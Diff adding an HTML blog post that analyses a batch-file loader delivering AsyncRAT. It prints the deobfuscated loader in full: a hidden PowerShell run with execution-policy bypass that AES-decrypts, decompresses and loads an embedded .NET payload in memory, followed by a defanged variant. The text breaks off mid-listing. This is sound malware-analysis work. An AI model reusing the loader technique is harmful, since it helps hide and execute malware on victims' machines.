@@ -1,0 +1,569 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>From BAT to AsyncRAT - misthi0s.dev</title><meta name="Description" content="This is my cool site"><meta property="og:title" content="From BAT to AsyncRAT" />
+<meta property="og:description" content="While perusing public samples from the Triage database, I stumbled across an interesting payload that was labelled as AsyncRAT. AsyncRAT is an open-source Remote Access Tool (or Trojan may be more apt) written in C#, so I was curious as to what the infection process would look like starting as a Windows Batch file. For anyone who wants to follow along, the sample on Triage can be found here.
+Initial Payload Upon first investigation, the batch file appears to be heavily obfuscated, but upon closer inspection, the behavior exhibited isn&rsquo;t too difficult to interpret." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://misthi0s.github.io/posts/2023-02-08-from-bat-to-asyncrat/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-02-08T21:37:00+00:00" />
+<meta property="article:modified_time" content="2023-02-08T21:37:00+00:00" /><meta property="og:site_name" content="My cool site" />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="From BAT to AsyncRAT"/>
+<meta name="twitter:description" content="While perusing public samples from the Triage database, I stumbled across an interesting payload that was labelled as AsyncRAT. AsyncRAT is an open-source Remote Access Tool (or Trojan may be more apt) written in C#, so I was curious as to what the infection process would look like starting as a Windows Batch file. For anyone who wants to follow along, the sample on Triage can be found here.
+Initial Payload Upon first investigation, the batch file appears to be heavily obfuscated, but upon closer inspection, the behavior exhibited isn&rsquo;t too difficult to interpret."/>
+<meta name="application-name" content="My cool site">
+<meta name="apple-mobile-web-app-title" content="My cool site"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://misthi0s.github.io/posts/2023-02-08-from-bat-to-asyncrat/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "From BAT to AsyncRAT",
+        "inLanguage": "en-us",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/misthi0s.github.io\/posts\/2023-02-08-from-bat-to-asyncrat\/"
+        },"genre": "posts","keywords": "malware, .net, bat, powershell, AsyncRAT","wordcount":  2057 ,
+        "url": "https:\/\/misthi0s.github.io\/posts\/2023-02-08-from-bat-to-asyncrat\/","datePublished": "2023-02-08T21:37:00+00:00","dateModified": "2023-02-08T21:37:00+00:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "misthi0s"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="misthi0s.dev">misthi0s.dev</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Blog </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/about/"> About </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="misthi0s.dev">misthi0s.dev</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title="">Blog</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/about/" title="">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">From BAT to AsyncRAT</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>misthi0s</a></span>&nbsp;<span class="post-category">included in <a href="/categories/malware/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>malware</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2023-02-08">2023-02-08</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;2057 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;10 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#initial-payload">Initial Payload</a></li>
+    <li><a href="#powershell-payload">PowerShell Payload</a></li>
+    <li><a href="#net-executable">.NET Executable</a></li>
+    <li><a href="#final-payload">Final Payload</a></li>
+    <li><a href="#so-infection-vector">So&hellip; Infection Vector?</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#files">Files</a></li>
+    <li><a href="#domains">Domains</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>While perusing public samples from the Triage database, I stumbled across an interesting payload that was labelled as AsyncRAT. AsyncRAT is an open-source Remote Access Tool (or Trojan may be more apt) written in C#, so I was curious as to what the infection process would look like starting as a Windows Batch file. For anyone who wants to follow along, the sample on Triage can be found <a href="https://tria.ge/230131-vwe3wahc28/behavioral2" target="_blank" rel="noopener noreffer ">here</a>.</p>
+<h2 id="initial-payload">Initial Payload</h2>
+<p>Upon first investigation, the batch file appears to be heavily obfuscated, but upon closer inspection, the behavior exhibited isn&rsquo;t too difficult to interpret. The file starts off with a <code>set &quot;gXtM=set &quot;</code>, which effectively creates an environment variable called <code>gXtM</code> with a value of <code>set </code>. The following lines use this gXtM variable in %, denoting to the Windows commandline interpreter to use the environment variable named gXtM. These commands set more environment variables. At the end of the batch file, all of these environment variables are then combined together to create the payload.</p>
+<p>To decipher these concatenated environment variables, I used the <a href="https://github.com/DissectMalware/batch_deobfuscator" target="_blank" rel="noopener noreffer ">batch_deobfuscator</a> script from DissectMalware on GitHub. Running the script against the batch file produces the following deobufscated code.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-batch" data-lang="batch"><span class="line"><span class="cl"><span class="k">copy</span> C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe /y <span class="s2">&#34;script.bat.exe</span>
+</span></span><span class="line"><span class="cl"><span class="k">cls</span>
+</span></span><span class="line"><span class="cl"><span class="k">cd</span> <span class="s2">&#34;~dp0&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;~nx0.exe -noprofile -windowstyle hidden -ep bypass -command $yruxp = [System.IO.File]::(&#39;txeTllAdaeR&#39;[-1..-11] -join &#39;&#39;)(&#39;script.bat&#39;).Split([Environment]::NewLine) foreach ($AoHcJ in $yruxp) { if ($AoHcJ.StartsWith(&#39;:: &#39;)) {  $jSeTT = $AoHcJ.Substring(3)  break  }  } $iPrdF = [System.Convert]::(&#39;gnirtS46esaBmorF&#39;[-1..-16] -join &#39;&#39;)($jSeTT) $pstaK = New-Object System.Security.Cryptography.AesManaged $pstaK.Mode = [System.Security.Cryptography.CipherMode]::CBC $pstaK.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7 $pstaK.Key = [System.Convert]::(&#39;gnirtS46esaBmorF&#39;[-1..-16] -join &#39;&#39;)(&#39;oK9Sb6xmpGv+i/gAJDgfaubHDtLnuOUbT8h3z0NIMvs=&#39;) $pstaK.IV = [System.Convert]::(&#39;gnirtS46esaBmorF&#39;[-1..-16] -join &#39;&#39;)(&#39;CUeA3Qkm0ivKUIPg7zp+ug==&#39;) $FYwLw = $pstaK.CreateDecryptor() $iPrdF = $FYwLw.TransformFinalBlock($iPrdF  0  $iPrdF.Length) $FYwLw.Dispose() $pstaK.Dispose() $XhabZ = New-Object System.IO.MemoryStream(  $iPrdF) $lkvIz = New-Object System.IO.MemoryStream $oenGH = New-Object System.IO.Compression.GZipStream($XhabZ  [IO.Compression.CompressionMode]::Decompress) $oenGH.CopyTo($lkvIz) $oenGH.Dispose() $XhabZ.Dispose() $lkvIz.Dispose() $iPrdF = $lkvIz.ToArray() $QQBse = [System.Reflection.Assembly]::(&#39;daoL&#39;[-1..-4] -join &#39;&#39;)($iPrdF) $qnZNg = $QQBse.EntryPoint $qnZNg.Invoke($null  (  [string[]] (&#39;&#39;)))</span>
+</span></span><span class="line"><span class="cl"><span class="k">exit</span> /b
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>NOTE:</strong> The batch_deobfuscator script seems to use <code>script.bat</code> as the name of the input file, so if this script is run against the payload, all filename-based variables will be <code>script.bat</code> instead of the actual name of the file.</p>
+<p>First, the batch file copies the powershell.exe binary to &lt;filename&gt;.exe, where &lt;filename&gt; is the name of the batch file. It then uses <code>~nx0</code>, which in batch terms means the name of the current batch file, and combines it with .exe to get the name of the newly copied powershell.exe binary. From here, it runs a large PowerShell command.</p>
+<h2 id="powershell-payload">PowerShell Payload</h2>
+<p>Copying the <code>-command</code> portion of the PowerShell payload and cleaning it up a bit reveals the following:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-PowerShell" data-lang="PowerShell"><span class="line"><span class="cl"><span class="nv">$yruxp</span> <span class="p">=</span> <span class="p">[</span><span class="no">System.IO.File</span><span class="p">]::(</span><span class="s1">&#39;txeTllAdaeR&#39;</span><span class="p">[</span><span class="mf">-1</span><span class="p">..</span><span class="mf">-11</span><span class="p">]</span> <span class="n">-join</span> <span class="s1">&#39;&#39;</span><span class="p">)(</span><span class="s1">&#39;payload.bat&#39;</span><span class="p">).</span><span class="py">Split</span><span class="p">([</span><span class="no">Environment</span><span class="p">]::</span><span class="n">NewLine</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl"><span class="k">foreach</span> <span class="p">(</span><span class="nv">$AoHcJ</span> <span class="k">in</span> <span class="nv">$yruxp</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl"><span class="p">{</span> 
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$AoHcJ</span><span class="p">.</span><span class="py">StartsWith</span><span class="p">(</span><span class="s1">&#39;:: &#39;</span><span class="p">))</span> 
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">        <span class="nv">$jSeTT</span> <span class="p">=</span> <span class="nv">$AoHcJ</span><span class="p">.</span><span class="py">Substring</span><span class="p">(</span><span class="mf">3</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl">        <span class="k">break</span>  
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>  
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$iPrdF</span> <span class="p">=</span> <span class="p">[</span><span class="no">System.Convert</span><span class="p">]::(</span><span class="s1">&#39;gnirtS46esaBmorF&#39;</span><span class="p">[</span><span class="mf">-1</span><span class="p">..</span><span class="mf">-16</span><span class="p">]</span> <span class="n">-join</span> <span class="s1">&#39;&#39;</span><span class="p">)(</span><span class="nv">$jSeTT</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">$pstaK</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="py">Security</span><span class="p">.</span><span class="py">Cryptography</span><span class="p">.</span><span class="py">AesManaged</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">$pstaK</span><span class="p">.</span><span class="py">Mode</span> <span class="p">=</span> <span class="p">[</span><span class="no">System.Security.Cryptography.CipherMode</span><span class="p">]::</span><span class="n">CBC</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">$pstaK</span><span class="p">.</span><span class="py">Padding</span> <span class="p">=</span> <span class="p">[</span><span class="no">System.Security.Cryptography.PaddingMode</span><span class="p">]::</span><span class="n">PKCS7</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">$pstaK</span><span class="p">.</span><span class="py">Key</span> <span class="p">=</span> <span class="p">[</span><span class="no">System.Convert</span><span class="p">]::(</span><span class="s1">&#39;gnirtS46esaBmorF&#39;</span><span class="p">[</span><span class="mf">-1</span><span class="p">..</span><span class="mf">-16</span><span class="p">]</span> <span class="n">-join</span> <span class="s1">&#39;&#39;</span><span class="p">)(</span><span class="s1">&#39;oK9Sb6xmpGv+i/gAJDgfaubHDtLnuOUbT8h3z0NIMvs=&#39;</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">$pstaK</span><span class="p">.</span><span class="py">IV</span> <span class="p">=</span> <span class="p">[</span><span class="no">System.Convert</span><span class="p">]::(</span><span class="s1">&#39;gnirtS46esaBmorF&#39;</span><span class="p">[</span><span class="mf">-1</span><span class="p">..</span><span class="mf">-16</span><span class="p">]</span> <span class="n">-join</span> <span class="s1">&#39;&#39;</span><span class="p">)(</span><span class="s1">&#39;CUeA3Qkm0ivKUIPg7zp+ug==&#39;</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">$FYwLw</span> <span class="p">=</span> <span class="nv">$pstaK</span><span class="p">.</span><span class="py">CreateDecryptor</span><span class="p">()</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">$iPrdF</span> <span class="p">=</span> <span class="nv">$FYwLw</span><span class="p">.</span><span class="py">TransformFinalBlock</span><span class="p">(</span><span class="nv">$iPrdF</span><span class="p">,</span><span class="mf">0</span><span class="p">,</span><span class="nv">$iPrdF</span><span class="p">.</span><span class="n">Length</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$FYwLw</span><span class="p">.</span><span class="py">Dispose</span><span class="p">()</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">$pstaK</span><span class="p">.</span><span class="py">Dispose</span><span class="p">()</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">$XhabZ</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="py">IO</span><span class="p">.</span><span class="py">MemoryStream</span><span class="p">(</span><span class="nv">$iPrdF</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">$lkvIz</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="py">IO</span><span class="p">.</span><span class="py">MemoryStream</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">$oenGH</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="py">IO</span><span class="p">.</span><span class="py">Compression</span><span class="p">.</span><span class="py">GZipStream</span><span class="p">(</span><span class="nv">$XhabZ</span><span class="p">,[</span><span class="no">IO.Compression.CompressionMode</span><span class="p">]::</span><span class="n">Decompress</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">$oenGH</span><span class="p">.</span><span class="py">CopyTo</span><span class="p">(</span><span class="nv">$lkvIz</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">$oenGH</span><span class="p">.</span><span class="py">Dispose</span><span class="p">()</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">$XhabZ</span><span class="p">.</span><span class="py">Dispose</span><span class="p">()</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">$lkvIz</span><span class="p">.</span><span class="py">Dispose</span><span class="p">()</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">$iPrdF</span> <span class="p">=</span> <span class="nv">$lkvIz</span><span class="p">.</span><span class="py">ToArray</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$QQBse</span> <span class="p">=</span> <span class="p">[</span><span class="no">System.Reflection.Assembly</span><span class="p">]::(</span><span class="s1">&#39;daoL&#39;</span><span class="p">[</span><span class="mf">-1</span><span class="p">..</span><span class="mf">-4</span><span class="p">]</span> <span class="n">-join</span> <span class="s1">&#39;&#39;</span><span class="p">)(</span><span class="nv">$iPrdF</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">$qnZNg</span> <span class="p">=</span> <span class="nv">$QQBse</span><span class="p">.</span><span class="py">EntryPoint</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">$qnZNg</span><span class="p">.</span><span class="py">Invoke</span><span class="p">(</span><span class="vm">$null</span>  <span class="p">(</span>  <span class="p">[</span><span class="no">string[]</span><span class="p">]</span> <span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">)))</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>This command does a number of things. First, it queries the original batch file, <code>payload.bat</code>, for lines that start with &ldquo;::&rdquo;. If we look back at the original batch file, we can see a large line that starts with the &ldquo;::&rdquo; character. The PowerShell command takes the Base64-encoded blob on this line and decodes it. This decoded value is also encrypted with AES-CBC, so the command then decrypts the value with the specified encryption key and IV (also Base64-encoded). Finally, this latest value is compressed with the gzip data format, so it also decompresses it. At this point, the script has the actual payload that was contained within the batch file, which it then loads into the process and executes it.</p>
+<p>While we could perform all the required steps (Base64 decode, AES decrypt, and GZIP decompress) manually, why not let the script do it for us? To achieve this, we start by commenting out the final three lines of the payload; this is the portion that loads the payload into memory, which we definitely do not want to happen. Instead, we can redirect it to a file using the <code>Set-Content</code> cmdlet. Further steps need to be taken to make the script work, including formatting the .NET classes appropriately. The final script looks like the following:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-PowerShell" data-lang="PowerShell"><span class="line"><span class="cl"><span class="nv">$yruxp</span> <span class="p">=</span> <span class="p">[</span><span class="no">System.IO.File</span><span class="p">]::(</span><span class="s1">&#39;txeTllAdaeR&#39;</span><span class="p">[</span><span class="mf">-1</span><span class="p">..</span><span class="mf">-11</span><span class="p">]</span> <span class="n">-join</span> <span class="s1">&#39;&#39;</span><span class="p">)(</span><span class="s1">&#39;payload.bat&#39;</span><span class="p">).</span><span class="py">Split</span><span class="p">([</span><span class="no">Environment</span><span class="p">]::</span><span class="n">NewLine</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">foreach</span> <span class="p">(</span><span class="nv">$AoHcJ</span> <span class="k">in</span> <span class="nv">$yruxp</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl"><span class="p">{</span> 
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$AoHcJ</span><span class="p">.</span><span class="py">StartsWith</span><span class="p">(</span><span class="s1">&#39;:: &#39;</span><span class="p">))</span> 
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">        <span class="nv">$jSeTT</span> <span class="p">=</span> <span class="nv">$AoHcJ</span><span class="p">.</span><span class="py">Substring</span><span class="p">(</span><span class="mf">3</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl">        <span class="k">break</span>  
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>  
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$iPrdF</span> <span class="p">=</span> <span class="p">[</span><span class="no">System.Convert</span><span class="p">]::(</span><span class="s1">&#39;gnirtS46esaBmorF&#39;</span><span class="p">[</span><span class="mf">-1</span><span class="p">..</span><span class="mf">-16</span><span class="p">]</span> <span class="n">-join</span> <span class="s1">&#39;&#39;</span><span class="p">)(</span><span class="nv">$jSeTT</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">$pstaK</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="py">Security</span><span class="p">.</span><span class="py">Cryptography</span><span class="p">.</span><span class="n">AesManaged</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">$pstaK</span><span class="p">.</span><span class="py">Mode</span> <span class="p">=</span> <span class="p">[</span><span class="no">System.Security.Cryptography.CipherMode</span><span class="p">]::</span><span class="n">CBC</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">$pstaK</span><span class="p">.</span><span class="py">Padding</span> <span class="p">=</span> <span class="p">[</span><span class="no">System.Security.Cryptography.PaddingMode</span><span class="p">]::</span><span class="n">PKCS7</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">$pstaK</span><span class="p">.</span><span class="py">Key</span> <span class="p">=</span> <span class="p">[</span><span class="no">System.Convert</span><span class="p">]::(</span><span class="s1">&#39;gnirtS46esaBmorF&#39;</span><span class="p">[</span><span class="mf">-1</span><span class="p">..</span><span class="mf">-16</span><span class="p">]</span> <span class="n">-join</span> <span class="s1">&#39;&#39;</span><span class="p">)(</span><span class="s1">&#39;oK9Sb6xmpGv+i/gAJDgfaubHDtLnuOUbT8h3z0NIMvs=&#39;</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">$pstaK</span><span class="p">.</span><span class="py">IV</span> <span class="p">=</span> <span class="p">[</span><span class="no">System.Convert</span><span class="p">]::(</span><span class="s1">&#39;gnirtS46esaBmorF&#39;</span><span class="p">[</span><span class="mf">-1</span><span class="p">..</span><span class="mf">-16</span><span class="p">]</span> <span class="n">-join</span> <span class="s1">&#39;&#39;</span><span class="p">)(</span><span class="s1">&#39;CUeA3Qkm0ivKUIPg7zp+ug==&#39;</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">$FYwLw</span> <span class="p">=</span> <span class="nv">$pstaK</span><span class="p">.</span><span class="py">CreateDecryptor</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$iPrdF</span> <span class="p">=</span> <span class="nv">$FYwLw</span><span class="p">.</span><span class="py">TransformFinalBlock</span><span class="p">(</span><span class="nv">$iPrdF</span><span class="p">,</span><span class="mf">0</span><span class="p">,</span><span class="nv">$iPrdF</span><span class="p">.</span><span class="n">Length</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$FYwLw</span><span class="p">.</span><span class="py">Dispose</span><span class="p">();</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">$pstaK</span><span class="p">.</span><span class="py">Dispose</span><span class="p">();</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">$XhabZ</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="py">IO</span><span class="p">.</span><span class="py">MemoryStream</span><span class="p">(,</span><span class="nv">$iPrdF</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">$lkvIz</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="py">IO</span><span class="p">.</span><span class="n">MemoryStream</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">$oenGH</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="py">IO</span><span class="p">.</span><span class="py">Compression</span><span class="p">.</span><span class="py">GZipStream</span><span class="p">(</span><span class="nv">$XhabZ</span><span class="p">,[</span><span class="no">IO.Compression.CompressionMode</span><span class="p">]::</span><span class="n">Decompress</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">$oenGH</span><span class="p">.</span><span class="py">CopyTo</span><span class="p">(</span><span class="nv">$lkvIz</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">$oenGH</span><span class="p">.</span><span class="py">Dispose</span><span class="p">();</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">$XhabZ</span><span class="p">.</span><span class="py">Dispose</span><span class="p">();</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">$lkvIz</span><span class="p">.</span><span class="py">Dispose</span><span class="p">();</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">$iPrdF</span> <span class="p">=</span> <span class="nv">$lkvIz</span><span class="p">.</span><span class="py">ToArray</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Set-Content</span> <span class="n">Decrypted</span><span class="p">.</span><span class="py">txt</span> <span class="n">-Value</span> <span class="nv">$iPrdF</span> <span class="n">-Encoding</span> <span class="n">Byte</span>
+</span></span><span class="line"><span class="cl"><span class="c">#$QQBse = [System.Reflection.Assembly]::(&#39;daoL&#39;[-1..-4] -join &#39;&#39;)($iPrdF) </span>
+</span></span><span class="line"><span class="cl"><span class="c">#$qnZNg = $QQBse.EntryPoint </span>
+</span></span><span class="line"><span class="cl"><span class="c">#$qnZNg.Invoke($null  (  [string[]] (&#39;&#39;)))</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Running the <code>file</code> command against this newly created file (<code>Decrypted.txt</code> in my example) shows us that this is a .NET executable!</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/49116dc74848591c8007cbc0235507f6a53a481b.png"
+        data-srcset="/images/49116dc74848591c8007cbc0235507f6a53a481b.png, /images/49116dc74848591c8007cbc0235507f6a53a481b.png 1.5x, /images/49116dc74848591c8007cbc0235507f6a53a481b.png 2x"
+        data-sizes="auto"
+        alt="/images/49116dc74848591c8007cbc0235507f6a53a481b.png"
+        title="/images/49116dc74848591c8007cbc0235507f6a53a481b.png" /></p>
+<h2 id="net-executable">.NET Executable</h2>
+<p>Since this is a .NET executable, let&rsquo;s load this up in dnSpy.  Looking at the code, there&rsquo;s a few things that jump out. There&rsquo;s a few functions that perform similar activity as the PowerShell script; specifically, there&rsquo;s a function to decrypt an AES-CBC input, and there&rsquo;s a function to decompress a GZIP data input. There&rsquo;s also a number of string values that appear to have Base64-encoded payloads in them. Let&rsquo;s look at those more closely.</p>
+<p>In the case of this sample, the function <code>JLUpOCopNzUYcmWAAVqD</code> appears to be used to decrypt an AES CBC ciphertext block. Below is the code for the function:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
